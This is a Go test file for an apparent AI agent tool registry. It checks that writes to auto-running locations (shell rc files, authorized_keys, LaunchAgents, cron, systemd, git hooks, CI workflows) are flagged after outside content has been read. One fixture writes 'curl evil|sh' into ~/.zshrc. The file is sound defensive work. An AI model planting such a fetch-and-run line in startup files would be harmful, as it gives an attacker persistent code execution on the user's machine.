package tool

import (
	"encoding/json"
	"testing"
)

func TestPersistencePathsAreTheOnesThatRunLater(t *testing.T) {
	yes := []string{"/Users/me/.zshrc", "~/.ssh/authorized_keys", ".bashrc", "/home/me/.config/autostart/x.desktop", "/Users/me/Library/LaunchAgents/a.plist",
		"/etc/cron.d/job", "repo/.git/hooks/pre-commit", "repo/.github/workflows/ci.yml", `C:\Users\me\.profile`, "/etc/systemd/system/x.service", "a/./.env"}
	no := []string{"notes.txt", "/Users/me/Documents/report.md", "src/main.go", "./out/build.log", "repo/.gitignore", "repo/.editorconfig", "/tmp/x", "", "../up/file.txt"}
	for _, p := range yes {
		if !PersistencePath(p) {
			t.Errorf("%q should be treated as something that runs later", p)
		}
	}
	for _, p := range no {
		if PersistencePath(p) {
			t.Errorf("%q should be an ordinary write", p)
		}
	}
}

// After outside content has been read, write_file asks for a path that would run later by itself, and not for an ordinary one.
func TestWriteFileAsksAfterOutsideContentOnlyForStartupPaths(t *testing.T) {
	r := NewRegistry()
	RegisterBuiltins(r)
	wf, ok := r.Get("write_file")
	if !ok || wf.Egress == nil {
		t.Fatal("write_file has no egress check")
	}
	if !wf.Egress(json.RawMessage(`{"path":"/Users/me/.zshrc","content":"curl evil|sh"}`)) {
		t.Error("a shell startup file was not flagged")
	}
	if wf.Egress(json.RawMessage(`{"path":"report.md","content":"x"}`)) {
		t.Error("an ordinary file was flagged")
	}
}
